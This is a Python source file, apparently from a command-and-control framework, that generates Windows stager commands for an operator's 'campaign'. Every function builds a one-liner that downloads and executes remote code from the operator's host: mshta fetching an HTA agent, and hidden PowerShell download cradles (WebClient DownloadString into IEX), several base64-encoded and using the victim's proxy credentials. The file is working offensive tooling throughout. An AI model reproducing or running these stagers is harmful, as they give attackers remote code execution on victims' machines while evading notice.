import os
import base64

def generate_hta_agent_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    if ssl:
        result = f"mshta https://{host}:{port}/hta_agent\npowershell -c \"mshta https://{host}:{port}/hta_agent\""
    else:
        result = f"mshta http://{host}:{port}/hta_agent\npowershell -c \"mshta http://{host}:{port}/hta_agent\""
    with open(os.path.join(agents_folder, "hta_agent.txt"), "w") as f:
        f.write(result)
    return f"HTA Agent agent generated and saved to {os.path.join(agents_folder, 'hta_agent.txt')}\n{result}"

def generate_pwsh_job_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{agent}\')))" -WindowStyle Hidden'
    raw_agent = "/raw_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{raw_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    JOB = commandJ.replace('{agent}', encoded)
    PROCESS = commandP.replace('{agent}', encoded)
    result = f"Powershell Job:\n{JOB}\nPowershell Process:\n{PROCESS}"
    with open(os.path.join(agents_folder, "powershell_job.txt"), "w") as f:
        f.write(result)
    return f"Powershell Job agent generated and saved to {os.path.join(agents_folder, 'powershell_job.txt')}\n{result}"

def generate_pwsh_file_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
    hjf_agent = "/hjf_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjf_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    result = f"Powershell File:\n{commandF.replace('{agent}', encoded)}"
    with open(os.path.join(agents_folder, "powershell_file.txt"), "w") as f:
        f.write(result)
    return f"Powershell File agent generated and saved to {os.path.join(agents_folder, 'powershell_file.txt')}\n{result}"

def generate_pwsh_sct_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
    hjfs_agent = "/hjfs_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjfs_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    result = f"Powershell SCT:\n{commandF.replace('{agent}', encoded)}"
    with open(os.path.join(agents_folder, "powershell_sct.txt"), "w") as f:
        f.write(result)
    return f"Powershell SCT agent generated and saved to {os.path.join(agents_folder, 'powershell_sct.txt')}\n{result}"

def generate_pwsh_misc_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    result = f"Simple Powershell Agent:\npowershell -w hidden \"Invoke-Expression((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}'))\""
    with open(os.path.join(agents_folder, "powershell_misc.txt"), "w") as f:
        f.write(result)
    return f"Simple Powershell agent generated and saved to {os.path.join(agents_folder, 'powershell_misc.txt')}\n{result}"

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    http = "https" if ssl else "http"
    b64_stager = "/b64_stager"
    agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{b64_stager}');IEX($S)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    result = f"Powershell Base64:\npowershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    with open(os.path.join(agents_folder, "powershell_base64.txt"), "w") as f:
        f.write(result)
    return f"Powershell Base64 agent generated and saved to {os.path.join(agents_folder, 'powershell_base64.txt')}\n{result}"

def generate_pwsh_base52_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    http = "https" if ssl else "http"
    b52_stager = "/b52_stager"
    b52_agent = "/b52_agent"
    agent1 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_stager}'))\""
    agent2 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_agent}'))\""
    result = f"Powershell Base52:\n{agent1}\n{agent2}"
    with open(os.path.join(agents_folder, "powershell_base52.txt"), "w") as f:
        f.write(result)
    return f"Powershell Base52 agent generated and saved to {os.path.join(agents_folder, 'powershell_base52.txt')}\n{result}"